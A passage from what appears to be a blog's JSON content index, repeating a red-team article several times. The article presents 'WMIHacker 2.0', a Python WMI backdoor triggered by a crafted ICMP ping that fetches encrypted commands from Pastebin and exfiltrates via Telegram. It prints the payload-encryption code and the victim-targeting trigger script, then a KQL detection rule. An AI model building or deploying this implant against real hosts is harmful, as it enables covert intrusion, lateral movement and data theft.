(C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted 